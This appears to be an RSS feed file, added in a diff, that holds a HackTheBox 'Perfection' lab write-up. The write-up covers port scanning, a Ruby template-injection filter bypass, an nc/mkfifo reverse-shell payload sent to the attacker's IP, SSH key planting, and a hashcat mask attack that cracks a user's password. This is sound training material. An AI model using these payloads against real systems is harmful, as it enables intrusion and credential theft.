@@ -1,0 +1,160 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Webrick on</title><link>https://h4r1337.github.io/tags/webrick/</link><description>Recent content in Webrick on</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Sun, 07 Jul 2024 11:34:41 +0530</lastBuildDate><atom:link href="https://h4r1337.github.io/tags/webrick/index.xml" rel="self" type="application/rss+xml"/><item><title>Perfection | HackTheBox</title><link>https://h4r1337.github.io/posts/perfection/</link><pubDate>Sun, 07 Jul 2024 11:34:41 +0530</pubDate><guid>https://h4r1337.github.io/posts/perfection/</guid><description>&lt;h3 id="overview">Overview&lt;/h3>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/perfection/cover.webp">&lt;/figure>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th style="text-align: center">Title&lt;/th>
+&lt;th style="text-align: center">&lt;a href="https://app.hackthebox.com/machines/Perfection">perfection&lt;/a>&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td style="text-align: center">Difficulty&lt;/td>
+&lt;td style="text-align: center">Easy&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td style="text-align: center">Machine&lt;/td>
+&lt;td style="text-align: center">Linux&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td style="text-align: center">Maker&lt;/td>
+&lt;td style="text-align: center">&lt;a href="https://app.hackthebox.com/users/1412009">&lt;img src="https://www.hackthebox.com/badge/image/1412009" alt="" style="display: unset">&lt;/a>&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;br>
+&lt;div class="alert alert-tip collapsed">
+&lt;div class="alert-heading-box" onclick="toggleAlert(this)" >
+&lt;i class="bx bx-bulb">&lt;/i>
+&lt;p class="alert-heading">
+About Perfection
+&lt;/p>
+&lt;i class='bx bx-chevron-down collapsed'>&lt;/i>
+&lt;/div>
+&lt;div class="alert-content" style="display: none;" >
+&lt;p>Perfection is an easy Linux machine that features a web application with functionality to calculate student scores. This application is vulnerable to Server-Side Template Injection (SSTI) via regex filter bypass. A foothold can be gained by exploiting the SSTI vulnerability. Enumerating the user reveals they are part of the &lt;code>sudo&lt;/code> group. Further enumeration uncovers a database with password hashes, and the user&amp;rsquo;s mail reveals a possible password format. Using a mask attack on the hash, the user&amp;rsquo;s password is obtained, which is leveraged to gain &lt;code>root&lt;/code> access.&lt;/p></description><content>&lt;h3 id="overview">Overview&lt;/h3>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/perfection/cover.webp">&lt;/figure>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th style="text-align: center">Title&lt;/th>
+&lt;th style="text-align: center">&lt;a href="https://app.hackthebox.com/machines/Perfection">perfection&lt;/a>&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td style="text-align: center">Difficulty&lt;/td>
+&lt;td style="text-align: center">Easy&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td style="text-align: center">Machine&lt;/td>
+&lt;td style="text-align: center">Linux&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td style="text-align: center">Maker&lt;/td>
+&lt;td style="text-align: center">&lt;a href="https://app.hackthebox.com/users/1412009">&lt;img src="https://www.hackthebox.com/badge/image/1412009" alt="" style="display: unset">&lt;/a>&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;br>
+&lt;div class="alert alert-tip collapsed">
+&lt;div class="alert-heading-box" onclick="toggleAlert(this)" >
+&lt;i class="bx bx-bulb">&lt;/i>
+&lt;p class="alert-heading">
+About Perfection
+&lt;/p>
+&lt;i class='bx bx-chevron-down collapsed'>&lt;/i>
+&lt;/div>
+&lt;div class="alert-content" style="display: none;" >
+&lt;p>Perfection is an easy Linux machine that features a web application with functionality to calculate student scores. This application is vulnerable to Server-Side Template Injection (SSTI) via regex filter bypass. A foothold can be gained by exploiting the SSTI vulnerability. Enumerating the user reveals they are part of the &lt;code>sudo&lt;/code> group. Further enumeration uncovers a database with password hashes, and the user&amp;rsquo;s mail reveals a possible password format. Using a mask attack on the hash, the user&amp;rsquo;s password is obtained, which is leveraged to gain &lt;code>root&lt;/code> access.&lt;/p>
+&lt;/div>
+&lt;/div>
+&lt;script>
+function toggleAlert(headerElement) {
+var alertBox = headerElement.parentElement;
+var alertContent = alertBox.querySelector('.alert-content');
+var icon = headerElement.querySelectorAll('i')[1];
+alertBox.classList.toggle('open');
+alertBox.classList.toggle('collapsed');
+if (alertBox.classList.contains('open')) {
+alertContent.style.display = 'block';
+icon.classList.remove('open');
+icon.classList.add('collapsed');
+} else {
+icon.classList.remove('collapsed');
+icon.classList.add('open');
+alertContent.style.display = 'none';
+}
+}
+&lt;/script>
+&lt;h2 id="information-gathering">Information Gathering&lt;/h2>
+&lt;p>Scanned all TCP ports:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>nmap -p- -vv -Pn -T4 --min-rate &lt;span style="color:#d3869b">1000&lt;/span> -oA nmap/ports 10.10.11.253
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#fe8019">for&lt;/span> 10.10.11.253
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up, received user-set &lt;span style="color:#fe8019">(&lt;/span>0.17s latency&lt;span style="color:#fe8019">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Scanned at 2024-05-03 16:40:54 IST &lt;span style="color:#fe8019">for&lt;/span> 85s
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Not shown: &lt;span style="color:#d3869b">64836&lt;/span> closed ports, &lt;span style="color:#d3869b">697&lt;/span> filtered ports
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Reason: &lt;span style="color:#d3869b">64836&lt;/span> conn-refused and &lt;span style="color:#d3869b">697&lt;/span> no-responses
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE REASON
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>22/tcp open ssh syn-ack
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http syn-ack
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Enumerated open TCP ports:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>nmap -p22,80 -sC -sV --min-rate &lt;span style="color:#d3869b">1000&lt;/span> -Pn -vv -oA nmap/service 10.10.11.253
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#fe8019">for&lt;/span> 10.10.11.253
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up, received user-set &lt;span style="color:#fe8019">(&lt;/span>0.20s latency&lt;span style="color:#fe8019">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Scanned at 2024-05-03 16:44:53 IST &lt;span style="color:#fe8019">for&lt;/span> 15s
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE REASON VERSION
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>22/tcp open ssh syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 &lt;span style="color:#fe8019">(&lt;/span>Ubuntu Linux; protocol 2.0&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http syn-ack nginx
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| http-methods:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ Supported Methods: GET HEAD
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Weighted Grade Calculator
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;hr>
+&lt;h3 id="port-80---http-webrick-170">Port 80 - HTTP (WEBrick &lt;code>1.7.0&lt;/code>)&lt;/h3>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/perfection/port-80.webp">&lt;/figure>
+&lt;h5 id="weighted-grade">&lt;code>/weighted-grade&lt;/code>&lt;/h5>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/perfection/weighted-grade.webp">&lt;/figure>
+&lt;p>Let&amp;rsquo;s fuzz all these inputs.&lt;/p>
+&lt;hr>
+&lt;h2 id="exploitation">Exploitation&lt;/h2>
+&lt;h3 id="ssti">SSTI&lt;/h3>
+&lt;p>After some trial and error through burp repeater I found that we can enter ruby SSTI
+payloads to exploit this. But the server is blocking malicious inputs - maybe there&amp;rsquo;s
+some regex in the backend stopping our inputs?&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/perfection/ssti.webp">&lt;/figure>
+&lt;p>Entering a new line character &lt;code>%0a&lt;/code> before the payload seems to solve the issue&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/perfection/ssti-bypass.webp">&lt;/figure>
+&lt;p>Now we can use the SSTI to send a rever shell payload to the server to get initial access.
+I used &lt;code>nc - mkfifo&lt;/code> payload for the reverse shell (works almost always).&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ruby" data-lang="ruby">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">&amp;lt;%=&lt;/span> &lt;span style="color:#fabd2f">system&lt;/span>(&lt;span style="color:#b8bb26">&amp;#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&amp;gt;&amp;amp;1|nc 10.10.14.41 1234 &amp;gt;/tmp/f&amp;#39;&lt;/span>) &lt;span style="color:#fe8019">%&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/perfection/shell.webp">&lt;/figure>
+&lt;h2 id="privilege-escalation">Privilege Escalation&lt;/h2>
+&lt;h3 id="local-enumeration">Local Enumeration&lt;/h3>
+&lt;p>I created a ssh key and inserted the public key into &lt;code>/home/susan/.ssh/authorized_keys&lt;/code>. Now we can access an interactive shell through ssh.&lt;/p>
+&lt;p>After some enumeration found this database file:&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/perfection/local-enum.webp">&lt;/figure>
+&lt;p>Downloaded the file into my machine using python simple http server and inside the db found these passwords:&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/perfection/credentials.webp">&lt;/figure>
+&lt;p>Another important finding: &lt;code>/var/mail/susan&lt;/code>&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/perfection/mail.webp">&lt;/figure>
+&lt;p>We can use this info and &lt;strong>&lt;a href="https://hashcat.net/wiki/doku.php?id=mask_attack">hashcat mask&lt;/a>&lt;/strong> attack to find the password.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>hashcat -m &lt;span style="color:#d3869b">1400&lt;/span> susan.hash -a &lt;span style="color:#d3869b">3&lt;/span> &lt;span style="color:#b8bb26">&amp;#39;susan_nasus_?d?d?d?d?d?d?d?d?d&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/perfection/hashcat.webp">&lt;/figure>
+&lt;h3 id="privilege-escalation-1">Privilege Escalation&lt;/h3>
+&lt;p>That was easy&amp;hellip;&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/perfection/root.webp">&lt;/figure>
+&lt;hr></content></item></channel></rss>
